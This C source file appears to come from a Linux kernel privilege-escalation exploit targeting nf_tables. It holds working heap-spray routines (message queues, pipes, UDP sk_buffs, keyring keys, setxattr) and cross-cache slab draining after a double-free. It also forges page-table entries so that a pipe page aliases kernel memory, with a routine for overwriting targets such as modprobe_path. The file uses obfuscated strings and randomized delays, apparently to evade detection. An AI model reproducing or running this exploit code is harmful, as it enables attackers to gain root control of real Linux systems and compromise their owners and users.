#include "nfttables.h"
#include "arch.h"
#include "offsets.h"
#include "obf.h"
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/keyctl.h>
#include <sys/syscall.h>
#include <time.h>

/* ── message queue spray ──────────────────────────────────────── */

void spray_msg_init(struct msg_spray *s, int count, size_t msg_size)
{
    memset(s, 0, sizeof(*s));
    s->count    = count > MAX_SPRAY_QUEUES ? MAX_SPRAY_QUEUES : count;
    s->msg_size = msg_size;
    for (int i = 0; i < MAX_SPRAY_QUEUES; i++)
        s->qids[i] = -1;
}

int spray_msg_alloc(struct msg_spray *s, const void *payload, size_t payload_len)
{
    struct {
        long mtype;
        char mtext[4096];
    } msg;

    size_t text_len = s->msg_size - sizeof(long);
    if (text_len > sizeof(msg.mtext))
        text_len = sizeof(msg.mtext);

    msg.mtype = 1;
    if (payload && payload_len > 0) {
        size_t fill = payload_len < text_len ? payload_len : text_len;
        memcpy(msg.mtext, payload, fill);
        if (fill < text_len)
            memset(msg.mtext + fill, 'A', text_len - fill);
    } else {
        memset(msg.mtext, 'A', text_len);
    }

    int allocated = 0;
    for (int i = 0; i < s->count; i++) {
        s->qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (s->qids[i] < 0) {
            pr_verb("spray_msg: msgget failed at %d: %s", i, strerror(errno));
            break;
        }
        for (int j = 0; j < s->msgs_per_queue; j++) {
            if (msgsnd(s->qids[i], &msg, text_len, 0) < 0) {
                pr_verb("spray_msg: msgsnd failed at %d/%d: %s", i, j, strerror(errno));
                break;
            }
        }
        allocated++;
        if ((i & 7) == 7) usleep(rand() % 500);
    }

    s->allocated = allocated;
    return allocated;
}

void spray_msg_free_range(struct msg_spray *s, int start, int end)
{
    struct { long mtype; char mtext[4096]; } msg;
    size_t text_len = s->msg_size - sizeof(long);
    if (text_len > sizeof(msg.mtext))
        text_len = sizeof(msg.mtext);

    for (int i = start; i < end && i < s->count; i++) {
        if (s->qids[i] >= 0) {
            while (msgrcv(s->qids[i], &msg, text_len, 0, IPC_NOWAIT) >= 0)
                ;
            msgctl(s->qids[i], IPC_RMID, NULL);
            s->qids[i] = -1;
        }
    }
}

void spray_msg_free(struct msg_spray *s)
{
    spray_msg_free_range(s, 0, s->count);
    s->allocated = 0;
}

/* ── pipe buffer spray ────────────────────────────────────────── */

void spray_pipe_init(struct pipe_spray *s, int count)
{
    memset(s, 0, sizeof(*s));
    s->count = count > MAX_SPRAY_PIPES ? MAX_SPRAY_PIPES : count;
}

int spray_pipe_alloc(struct pipe_spray *s)
{
    char fill[PAGE_SZ];
    memset(fill, 0x42, sizeof(fill));

    int allocated = 0;
    for (int i = 0; i < s->count; i++) {
        if (pipe(s->fds[i]) < 0) {
            pr_verb("spray_pipe: pipe failed at %d: %s", i, strerror(errno));
            break;
        }
        ssize_t n = write(s->fds[i][1], fill, sizeof(fill));
        if (n < (ssize_t)sizeof(fill)) {
            pr_verb("spray_pipe: short write at %d", i);
        }
        allocated++;
        if ((i & 7) == 7) usleep(rand() % 500);
    }

    s->allocated = allocated;
    return allocated;
}

int spray_pipe_read(struct pipe_spray *s, int idx, void *buf, size_t len)
{
    if (idx < 0 || idx >= s->allocated)
        return -1;
    return read(s->fds[idx][0], buf, len);
}

int spray_pipe_write(struct pipe_spray *s, int idx, const void *buf, size_t len)
{
    if (idx < 0 || idx >= s->allocated)
        return -1;
    return write(s->fds[idx][1], buf, len);
}

void spray_pipe_free(struct pipe_spray *s)
{
    for (int i = 0; i < s->count; i++) {
        if (s->fds[i][0] > 0) { close(s->fds[i][0]); s->fds[i][0] = 0; }
        if (s->fds[i][1] > 0) { close(s->fds[i][1]); s->fds[i][1] = 0; }
    }
    s->allocated = 0;
}

/* ── PTE spray ────────────────────────────────────────────────── */

void spray_pte_init(struct pte_spray *s, int npages)
{
    memset(s, 0, sizeof(*s));
    s->npages = npages;
}

int spray_pte_alloc(struct pte_spray *s)
{
    s->region_sz = (size_t)s->npages * PAGE_SZ;
    s->region = mmap(NULL, s->region_sz, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (s->region == MAP_FAILED) {
        s->region = NULL;
        return -1;
    }
    return 0;
}

static bool pte_looks_valid(uint64_t val)
{
#ifdef ARCH_X86_64
    if (!(val & _PAGE_PRESENT))
        return false;
    uint64_t phys = val & PTE_PFN_MASK;
    return phys != 0 && phys < (1ULL << 40);
#else
    (void)val;
    return false;
#endif
}

int spray_pte_find_overlap(struct pte_spray *pte, struct pipe_spray *pipes,
                           int *out_pipe_idx)
{
    uint64_t page[PAGE_SZ / sizeof(uint64_t)];

    for (int i = 0; i < pipes->allocated; i++) {
        ssize_t n = read(pipes->fds[i][0], page, PAGE_SZ);
        if (n != (ssize_t)PAGE_SZ)
            continue;

        int hits = 0;
        for (int j = 0; j < 512; j++) {
            if (pte_looks_valid(page[j]))
                hits++;
        }

        if (hits > 32) {
            pr_verb("PTE overlap found in pipe %d (%d valid entries)", i, hits);
            *out_pipe_idx = i;
            return 0;
        }
    }
    return -1;
}

void spray_pte_free(struct pte_spray *s)
{
    if (s->region) {
        munmap(s->region, s->region_sz);
        s->region = NULL;
    }
}

/* ── cross-cache drain ────────────────────────────────────────── */

int cross_cache_drain(struct msg_spray *primary, struct msg_spray *secondary,
                      const struct slab_info *si)
{
    /*
     * To return a slab page to the page allocator:
     * 1. Fill the slab with objects (primary spray already did this
     *    before the double-free)
     * 2. Free all objects from the target slab page
     *
     * The secondary spray helps by filling OTHER slab pages in the same
     * cache so that our target page is the one that gets freed.
     *
     * For SLUB: free all objects on a slab page and it returns to the
     * page allocator (if cpu_partial slabs < min_partial).
     */

    if (!si || si->objs_per_slab == 0) {
        /* no slab info, use heuristic: free a range of messages and hope
           the slab page drains */
        spray_msg_free_range(primary, 0, primary->count / 2);
        return 0;
    }

    /* free batches of objs_per_slab objects at a time to increase the
       chance of completely draining a slab page */
    int batch = si->objs_per_slab;
    for (int i = 0; i < primary->count; i += batch) {
        int end = i + batch;
        if (end > primary->count) end = primary->count;
        spray_msg_free_range(primary, i, end);
    }

    return 0;
}

/* ── sk_buff spray (UDP socket) ───────────────────────────────── */

int spray_skb_alloc(struct skb_spray *s, int count, size_t size)
{
    memset(s, 0, sizeof(*s));
    s->count = count > MAX_SPRAY_SKB ? MAX_SPRAY_SKB : count;
    s->size  = size;

    s->sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (s->sock < 0)
        return -1;

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port   = htons(0),
        .sin_addr   = { .s_addr = htonl(INADDR_LOOPBACK) },
    };

    if (bind(s->sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(s->sock);
        return -1;
    }

    /* set large receive buffer to hold spray objects */
    int rcvbuf = count * size * 2;
    setsockopt(s->sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));

    /* get actual bound port */
    socklen_t alen = sizeof(addr);
    getsockname(s->sock, (struct sockaddr *)&addr, &alen);
    s->port = ntohs(addr.sin_port);

    /* spray UDP packets to ourselves */
    char *buf = calloc(1, size);
    if (!buf) { close(s->sock); return -1; }
    memset(buf, 'S', size);

    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = addr.sin_port,
        .sin_addr   = { .s_addr = htonl(INADDR_LOOPBACK) },
    };

    for (int i = 0; i < count; i++) {
        sendto(s->sock, buf, size, 0, (struct sockaddr *)&dst, sizeof(dst));
        if ((i & 7) == 7) usleep(rand() % 500);
    }

    free(buf);
    s->allocated = count;
    return count;
}

void spray_skb_free(struct skb_spray *s)
{
    if (s->sock >= 0) {
        /* receive all queued packets to free sk_buffs */
        char drain[4096];
        while (recv(s->sock, drain, sizeof(drain), MSG_DONTWAIT) > 0)
            ;
        close(s->sock);
        s->sock = -1;
    }
    s->allocated = 0;
}

/* ── add_key spray ────────────────────────────────────────────── */

int spray_key_alloc(struct key_spray *s, int count, size_t payload_size,
                    const void *payload)
{
    memset(s, 0, sizeof(*s));
    s->count = count > MAX_SPRAY_KEYS ? MAX_SPRAY_KEYS : count;

    char desc[64];
    for (int i = 0; i < s->count; i++) {
        snprintf(desc, sizeof(desc), "nft_%d", i);
        long serial = syscall(__NR_add_key, "user", desc,
                              payload, payload_size,
                              KEY_SPEC_PROCESS_KEYRING);
        if (serial < 0) {
            pr_verb("spray_key: add_key failed at %d: %s", i, strerror(errno));
            break;
        }
        s->serials[i] = (int32_t)serial;
        s->allocated++;
    }
    return s->allocated;
}

void spray_key_free(struct key_spray *s)
{
    for (int i = 0; i < s->allocated; i++) {
        if (s->serials[i] > 0) {
            syscall(__NR_keyctl, 0 /* KEYCTL_REVOKE */, s->serials[i]);
        }
    }
    s->allocated = 0;
}

/* ── setxattr ephemeral spray ─────────────────────────────────── */

int spray_xattr(size_t size, int count)
{
    /*
     * setxattr allocates a kmalloc buffer for the value, copies data in,
     * then frees it on return. Useful for briefly occupying a slab slot
     * during a race window. Not persistent like msgsnd.
     *
     * We spray by setting xattrs on /tmp files in rapid succession.
     */
    char *buf = calloc(1, size);
    if (!buf) return -1;
    memset(buf, 'X', size);

    char path[64];
    snprintf(path, sizeof(path), S(S_NFT_XATTR_FMT), getpid());

    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) { free(buf); return -1; }
    close(fd);

    int ok = 0;
    for (int i = 0; i < count; i++) {
        char name[32];
        snprintf(name, sizeof(name), "user.nft%d", i);
        if (syscall(__NR_setxattr, path, name, buf, size, 0) == 0)
            ok++;
    }

    unlink(path);
    free(buf);
    return ok;
}

/* ── forged PTE construction ──────────────────────────────────── */

uint64_t forge_pte(uint64_t phys_addr, bool writable, bool usermode)
{
#ifdef ARCH_X86_64
    uint64_t pte = (phys_addr & PTE_PFN_MASK) | _PAGE_PRESENT | _PAGE_ACCESSED;
    if (writable) pte |= _PAGE_RW | _PAGE_DIRTY;
    if (usermode) pte |= _PAGE_USER;
    return pte;
#else
    (void)phys_addr; (void)writable; (void)usermode;
    return 0;
#endif
}

/* ── modprobe_path overwrite via PTE ──────────────────────────── */

int overwrite_via_pte(struct pte_spray *pte, struct pipe_spray *pipes,
                      int pipe_idx, uint64_t target_vaddr,
                      const void *data, size_t len,
                      uint64_t physmap_base)
{
    uint64_t phys_page = (target_vaddr - physmap_base) & PAGE_MASK;
    uint64_t offset    = target_vaddr & ~PAGE_MASK;

    if (!pte->region)
        return -1;

    uint8_t *victim_va = (uint8_t *)pte->region;
    int slot = (((uint64_t)victim_va) >> 12) & 0x1FF;

    uint64_t pte_page[512];
    memset(pte_page, 0, sizeof(pte_page));
    pte_page[slot] = forge_pte(phys_page, true, true);

    pr_verb("forged PTE[%d] = 0x%lx (phys 0x%lx + 0x%lx)",
            slot, pte_page[slot], phys_page, offset);

    if (spray_pipe_write(pipes, pipe_idx, pte_page, PAGE_SZ) != (int)PAGE_SZ)
        return -1;

    /* flush TLB for the target VA */
    munmap(victim_va, PAGE_SZ);
    void *remap = mmap(victim_va, PAGE_SZ, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (remap == MAP_FAILED)
        return -1;

    memcpy((char *)remap + offset, data, len);
    return 0;
}
